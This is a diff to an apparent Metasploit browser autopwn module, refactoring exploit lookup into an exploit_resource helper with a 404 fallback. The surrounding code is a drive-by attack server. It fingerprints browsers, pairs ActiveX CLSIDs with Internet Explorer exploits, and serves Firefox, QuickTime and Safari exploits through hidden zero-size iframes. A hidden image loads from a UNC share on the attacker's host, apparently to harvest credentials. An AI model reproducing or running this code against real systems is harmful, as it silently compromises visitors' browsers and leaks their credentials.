@@ -266,24 +266,24 @@ class Metasploit3 < Msf::Auxiliary
 		objects = []
 
 		objects += [ 
-			[ 'DirectAnimation.PathControl',            'KeyFrame', @exploits['exploit/windows/browser/ms06_067_keyframe'].get_resource ],
-			[ 'LPViewer.LPViewer.1',                    'URL', @exploits['exploit/windows/browser/lpviewer_url'].get_resource ],
-			[ '{88D969C5-F192-11D4-A65F-0040963251E5}', 'SetRequestHeader', @exploits['exploit/windows/browser/ms06_071_xml_core'].get_resource ],
-			[ '{36723F97-7AA0-11D4-8919-FF2D71D0D32C}', 'GetDriverSettings', @exploits['exploit/windows/browser/novelliprint_getdriversettings'].get_resource ],
-			[ '{BD96C556-65A3-11D0-983A-00C04FC29E36}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
-			[ '{BD96C556-65A3-11D0-983A-00C04FC29E30}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ],
-			[ '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ],
-			[ '{6414512B-B978-451D-A0D8-FCFDF33E833C}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
-			[ '{06723E09-F4C2-43C8-8358-09FCD1DB0766}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
-			[ '{639F725F-1B2D-4831-A9FD-874847682010}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
-			[ '{BA018599-1DB3-44F9-83B4-461454C84BF8}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
-			[ '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
-			[ '{E8CCCDDF-CA28-496B-B050-6C07C962476B}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
-			[ '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
-			[ '{0006F033-0000-0000-C000-000000000046}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ],
-			[ '{0006F03A-0000-0000-C000-000000000046}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ],
-			[ '{67A5F8DC-1A4B-4D66-9F24-A704AD929EEE}', 'Init', @exploits['exploit/windows/browser/systemrequirementslab_unsafe'].get_resource ],
-			[ '{A8D3AD02-7508-4004-B2E9-AD33F087F43C}', 'GetDetailsString', @exploits['exploit/windows/browser/ms08_053_mediaencoder'].get_resource ],
+			[ 'DirectAnimation.PathControl',            'KeyFrame', exploit_resource('exploit/windows/browser/ms06_067_keyframe') ],
+			[ 'LPViewer.LPViewer.1',                    'URL', exploit_resource('exploit/windows/browser/lpviewer_url') ],
+			[ '{88D969C5-F192-11D4-A65F-0040963251E5}', 'SetRequestHeader', exploit_resource('exploit/windows/browser/ms06_071_xml_core') ],
+			[ '{36723F97-7AA0-11D4-8919-FF2D71D0D32C}', 'GetDriverSettings', exploit_resource('exploit/windows/browser/novelliprint_getdriversettings') ],
+			[ '{BD96C556-65A3-11D0-983A-00C04FC29E36}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
+			[ '{BD96C556-65A3-11D0-983A-00C04FC29E30}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ],
+			[ '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ],
+			[ '{6414512B-B978-451D-A0D8-FCFDF33E833C}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
+			[ '{06723E09-F4C2-43C8-8358-09FCD1DB0766}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
+			[ '{639F725F-1B2D-4831-A9FD-874847682010}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
+			[ '{BA018599-1DB3-44F9-83B4-461454C84BF8}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
+			[ '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
+			[ '{E8CCCDDF-CA28-496B-B050-6C07C962476B}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
+			[ '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
+			[ '{0006F033-0000-0000-C000-000000000046}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ],
+			[ '{0006F03A-0000-0000-C000-000000000046}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ],
+			[ '{67A5F8DC-1A4B-4D66-9F24-A704AD929EEE}', 'Init', exploit_resource('exploit/windows/browser/systemrequirementslab_unsafe') ],
+			[ '{A8D3AD02-7508-4004-B2E9-AD33F087F43C}', 'GetDetailsString', exploit_resource('exploit/windows/browser/ms08_053_mediaencoder') ],
 		]
 		objects = objects.map{ |arr| "new Array('#{arr[0]}', '#{arr[1]}', '#{arr[2]}')," }.join("\n").chop
 
@@ -416,12 +416,12 @@ class Metasploit3 < Msf::Auxiliary
 				else {
 					//debug("this is NOT MSIE<br />");
 					if (window.navigator.javaEnabled && window.navigator.javaEnabled()) {
-						sploit_frame += "#{build_iframe(@exploits['exploit/multi/browser/mozilla_navigatorjava'].get_resource)}";
+						sploit_frame += '#{build_iframe(exploit_resource('exploit/multi/browser/mozilla_navigatorjava'))}';
 					} else {
 						//debug("NO exploit/multi/browser/mozilla_navigatorjava");
 					}
 					if (window.InstallVersion) {
-						sploit_frame += "#{build_iframe(@exploits['exploit/multi/browser/mozilla_compareto'].get_resource)}";
+						sploit_frame += '#{build_iframe(exploit_resource('exploit/multi/browser/mozilla_compareto'))}';
 					} else {
 						//debug("NO exploit/multi/browser/mozilla_compareto");
 					}
@@ -429,7 +429,7 @@ class Metasploit3 < Msf::Auxiliary
 					// this check won't be necessary
 					if ("#{OperatingSystems::MAC_OSX}" == detected_version.os_name) {
 						if (location.QueryInterface) {
-							sploit_frame += "#{build_iframe(@exploits['exploit/multi/browser/firefox_queryinterface'].get_resource)}";
+							sploit_frame += '#{build_iframe(exploit_resource('exploit/multi/browser/firefox_queryinterface'))}';
 						}
 					}
 				}
@@ -477,7 +477,7 @@ class Metasploit3 < Msf::Auxiliary
 		#
 		
 		body << "<!--[if lt IE 7]>"
-		body << build_iframe(@exploits['exploit/windows/browser/ms03_020_ie_objecttype'].get_resource)
+		body << build_iframe(exploit_resource('exploit/windows/browser/ms03_020_ie_objecttype'))
 		#body << "Internet Explorer &lt; version 7"
 		body << "<![endif]-->"
 
@@ -488,8 +488,8 @@ class Metasploit3 < Msf::Auxiliary
 			<img src="\\\\#{@lhost}\\#{share_name}\\#{img_name}" style="visibility:hidden" height="0" width="0" border="0" />
 		}
 		body << "<div id=\"osx-non-js\">"
-		body << build_iframe(@exploits['exploit/windows/browser/apple_quicktime_rtsp'].get_resource)
-		body << build_iframe(@exploits['exploit/osx/armle/safari_libtiff'].get_resource)
+		body << build_iframe(exploit_resource('exploit/windows/browser/apple_quicktime_rtsp'))
+		body << build_iframe(exploit_resource('exploit/osx/armle/safari_libtiff'))
 		body << "</div>"
 
 		response.body = ' <html > <head > <title > Loading </title> '
@@ -653,5 +653,13 @@ class Metasploit3 < Msf::Auxiliary
 		#ret << "<p>#{resource}</p>"
 		ret << "<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>"
 		return ret
+	end
+
+	def exploit_resource(mod)
+		if (@exploits[mod])
+			return @exploits[mod].get_resource
+		else
+			return "404.html"
+		end
 	end
 end
